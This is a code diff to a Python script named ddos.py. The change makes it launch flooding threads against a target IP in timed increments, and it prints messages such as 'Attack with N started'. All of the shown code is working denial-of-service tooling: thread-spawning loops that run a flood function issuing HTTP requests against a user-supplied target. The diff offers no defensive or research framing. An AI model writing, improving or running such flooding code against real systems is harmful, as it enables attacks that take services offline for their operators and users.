@@ -23,16 +23,25 @@ def flood2(target_ip):
         urlopen(rq)
 
 
-if len(sys.argv) < 3:
-    print("Usage: ddos.py <number of threads> <target ip>")
+if len(sys.argv) < 5:
+    print("Usage: ddos.py <total number of threads> <number of thread increment> <period between increments> <target ip>")
     sys.exit()
+
+total_number_threads = int(sys.argv[1])
+number_thread_increment = int(sys.argv[2])
+period_between_increments = int(sys.argv[3])
+target_ip = sys.argv[4]
 thread_list = []
-for i in range(0, int(sys.argv[1])):
-    # t = threading.Thread(target=flood, args=(), )
-    t = threading.Thread(target=flood2, args=(sys.argv[2], ))
-    t.daemon = True
-    t.start()
-    thread_list.append(t)
+print (int(total_number_threads/number_thread_increment))
+for j in range(0, int(total_number_threads/number_thread_increment)):
+    for i in range(0, number_thread_increment):
+        # t = threading.Thread(target=flood, args=(), )
+        t = threading.Thread(target=flood2, args=(target_ip, ))
+        t.daemon = True
+        t.start()
+        thread_list.append(t)
+    print("Attack with " + str((j+1)*number_thread_increment) + " started")
+    time.sleep(period_between_increments)
 
 for i in range(0, len(thread_list)):
     thread_list[i].join()
